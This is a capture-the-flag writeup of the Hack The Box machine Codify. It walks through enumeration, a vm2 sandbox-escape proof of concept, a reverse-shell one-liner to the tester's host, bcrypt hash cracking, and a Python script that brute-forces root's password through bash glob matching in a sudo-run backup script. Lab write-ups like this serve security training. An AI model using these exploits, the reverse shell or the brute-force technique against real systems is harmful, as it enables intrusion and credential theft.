---
title: Codify Writeup
date: 2024-02-13 12:00 +0100
author: Kyllano
categories: [HTB Writeup]
tags: [cybersecurity, htb, writeup]
---


## Enumeration

Let's first do our enumeration with an nmap :

```
Nmap scan report for codify.htb (10.10.11.239)
Host is up (0.029s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Codify
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Codify
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.32 seconds
```

We see that some node.js is running on port 3000. I don't know if we could do something with it. We also have some ssh, but since there's usually no exploit on that part we could check out the webserver that is running on port 80. Before that though, let's do some directory enumeration using dirsearch :

```
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11718

Output: /home/kyll/Desktop/code_folder/Tools/dirsearch/reports/http_codify.htb/__24-02-02_16-38-11.txt

Target: http://codify.htb/

[16:38:11] Starting: 
[16:38:41] 200 -    3KB - /About
[16:38:41] 200 -    3KB - /about
[16:39:40] 200 -    3KB - /editor
[16:39:41] 200 -    3KB - /editor/
[16:40:40] 403 -  275B  - /server-status/
[16:40:40] 403 -  275B  - /server-status

Task Completed
```

okay, not much on that part, let's check out the website :

<img src="/assets/img/Codify/codi1.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Also there's the editor :

<img src="/assets/img/Codify/codi2.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Nothing much in there except the editor, which will let us run some code. We can check out the about page :

<img src="/assets/img/Codify/codi3.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

An interesting thing is that this uses the `vm2` library, which has some interesting CVE :)

## Exploiting vm2

By typing `vm2 exloit` on Google, we find [this](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) proof of concept for the `CVE-2023-37466` which looks like this code :

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('echo coucou');
}
`

console.log(vm.run(code));
```

Here the vulnerability is on the way the `vm2` handles the JS `Promise` object (which would be the completion or failure of some provided code)



Now let's try and run this `echo coucou` command :

<img src="/assets/img/Codify/codi4.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

It works! Now let's try for a reverse shell! Since the `-c` and `-e` options are not in the distant machine (I tried a revershell with those). Also the `sh -i >& /dev/tcp/10.10.14.87/12345 0>&1` command shows a `bad file descriptor` error.

We'll have to use [this](https://spencerdodd.github.io/2017/02/21/reverse_shell_without_nce/), which is a roundabout way of doing a reverse shell but it works :

<img src="/assets/img/Codify/codi5.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Now that we're connected to the machine as `svc`, let's stabilize the shell by doing [this](https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal) :

<img src="/assets/img/Codify/codi6.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="300"/>

## Getting Joshua

Now we'll try and get the user. After a bit of research, we find the file `/var/www/contact/ticket.db`, which if we `cat` or use `string` on it, we'll find this :

```
svc@codify:/var/www/contact$ strings tickets.db
strings tickets.db
SQLite format 3
otableticketstickets
CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
    tableusersusers
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
    ))
indexsqlite_autoindex_users_1users
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
joshua
users
tickets
Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open
Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
```

We can see a hash with joshua's name before it `joshua2a12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`, let's check what kind of hash this is and let's try and crack it :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Software_exploitation/HTB/Codify$ hashid
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
Analyzing '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```

So this is bcrypt, let's decrypt it using john the ripper :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/HTB/Codify$ john hash --format=bcrypt --wordlist=/home/kyll/Desktop/code_folder/Tools/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
spongebob1       (joshua)     
1g 0:00:00:28 DONE (2024-02-02 17:33) 0g/s 48.24p/s 48.24c/s 48.24C/s winston..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now we can connect to joshua using our newfound password `spongebob1` :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Software_exploitation/HTB/Codify$ ssh joshua@codify.htb
The authenticity of host 'codify.htb (10.10.11.239)' can't be established.
ECDSA key fingerprint is SHA256:uw/jWXjXA/tl23kwRKzW+MkhMkNAVc1Kwwlm8EnJrqI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added 'codify.htb' (ECDSA) to the list of known hosts.
joshua@codify.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

[...]

Last login: Sat Feb  3 11:37:42 2024 from 10.10.14.61
joshua@codify:~$ whoami
joshua
joshua@codify:~$ 
```

We can now get the user flag :

```bash
joshua@codify:~$ cat user.txt
4fbfbaba86326bac045df7bd03871496
```

## Privilege escalation

Now that we have a foothold on joshua, we'll try and privilege escalate to root.

let's do a `sudo -l` to see which application we can run as root :

```bash
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

If we run it, we get this :

<img src="/assets/img/Codify/codi7.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="500"/>

It tries to prompt us for root's password.

Let's check out what's inside that script :

```bash
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh 
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

This script prompts you for a password and if shows either `Password confirmed` or `Password confirmation failed!`. After that, the scripts executes some irrelevant code regarding some database.

For this part, I admit that I needed a hint from my colleague. They told me to use pattern matching and showed my that when you execute the script and you put a `*` wildcard, the password check tells you `Password confirmed`.

From this point on I understood what happened. The part that is vulnerable is that part of the code :

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```

If `$USER_PASS` is `*`, then whatever `$DB_PASS` is, the equality test `DB_PASS == USER_PASS` will always return true since in bash `*` means any string litteral of arbitrary size. Now we can use further pattern matching to guess the size of the string. To do this, we will use the `?` pattern which represent 1 character. If we try `?` then `??` then `???` etc., it will give us  `Password confirmation failed!` until we have the right number of `?` pattern and then it will prompt us with `Password confirmed!`. Here is the python script that guess the good number of character :

```python
import subprocess

def cmd(cmd:str) :
    return subprocess.run(cmd, shell=True, stdout=subprocess.PIPE).stdout.decode('UTF-8')

prg_path="/opt/scripts/mysql-backup.sh"

#First we need to know the length of the password :
passwd = "?"
command= "echo "+passwd+" | " + prg_path + " 2>/dev/null"

while ("Password confirmation failed!" in cmd(command)) :
    passwd += "?"
    command= "/usr/bin/echo "+passwd+" | sudo " + prg_path + " 2>/dev/null"


print("Password is of size", len(passwd))
```

The output looks like this :

<img src="/assets/img/Codify/codi8.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="500"/>

Now that we know the size, we can substitute the character `?` by one of the possible character for a password. We will try replacing the first `?` by one of the character for a password, iteratively until we get a `Password confirmed!`. When we get a positive for the first `?`, we do the same for the second, and so on and so forth until we get every character guessed right. Here's the complete Python code that does this and guessing the size:

```python
import subprocess
import string

def cmd(cmd:str) :
    return subprocess.run(cmd, shell=True, stdout=subprocess.PIPE).stdout.decode('UTF-8')

def change_char(string: str, pos: int, new_char) :
    string  = list(string)
    string [pos] = new_char
    string  = "".join(string)
    return string

prg_path="/home/kyll/Desktop/code_folder/HTB/Codify/vuln.bash"

#First we need to know the length of the password :
passwd = "?"
command= "echo "+passwd+" | " + prg_path

while ("Password confirmation failed!" in cmd(command)) :
    passwd += "?"
    command= "/usr/bin/echo "+passwd+" | sudo " + prg_path + " 2>/dev/null"


# Now we have a password of length n , let's try to bretueforce each character
alphabet = string.ascii_letters + string.digits + string.punctuation

for i in range(0, len(passwd)) :
    i_alphabet = 0
    passwd = change_char(passwd, i, alphabet[i_alphabet])
    command= "/usr/bin/echo "+passwd+" | sudo " + prg_path+ " 2>/dev/null"
    while ("Password confirmation failed!" in cmd(command) and i_alphabet < len(alphabet)) :
        i_alphabet += 1
        passwd = change_char(passwd, i, alphabet[i_alphabet])
        command= "/usr/bin/echo "+passwd+" | sudo " + prg_path+ " 2>/dev/null"

    if (i_alphabet == len(alphabet)) :
        print("failed to crack it :(")
        exit(-1)

    print("password :", passwd)

print("We did it!", passwd)
```

The output looks like this :

<img src="/assets/img/Codify/codi9.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Great, we've cracked root's password, let's use it to get the root flag :

```bash
joshua@codify:~$ su root
Password: 
root@codify:/home/joshua# cd ~
root@codify:~# cat root.txt
1536d996669648dfdcc411fbda9846fd
```

And just like that, Codify has been pwned!